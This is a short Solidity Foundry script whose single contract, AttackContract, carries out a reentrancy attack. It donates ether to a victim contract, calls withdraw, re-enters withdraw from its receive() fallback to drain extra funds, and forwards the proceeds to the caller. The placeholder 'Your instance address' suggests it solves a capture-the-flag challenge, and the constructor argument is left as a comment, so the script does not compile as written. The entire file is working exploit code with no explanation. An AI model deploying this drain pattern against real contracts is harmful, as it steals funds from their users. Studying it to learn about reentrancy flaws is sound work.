//SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";

interface Ivictim { function withdraw(uint256 _amount) external; }

contract AttackScript is Script {
	AttackContract attackContract;
	
	function run() public {
	vm.startBroadcast();
	attackContract = new AttackContract{value: 0.001 ether}( /* Your instance address */ );
	attackContract.attack();
	vm.stopBroadcast();
}

}

contract AttackContract {
	address victim;	
	uint256 amount;	

	constructor(address _victim) payable {
	victim = _victim;
}
	receive() external payable {
	try Ivictim(victim).withdraw(0.001 ether) {} catch {}
}

	function attack() external {
	victim.call{value: 0.001 ether}(abi.encodeWithSignature("donate(address)", address(this)));
	victim.call(abi.encodeWithSignature("withdraw(uint256)", 0.001 ether));
	msg.sender.call{value: 0.002 ether}("");
}
}
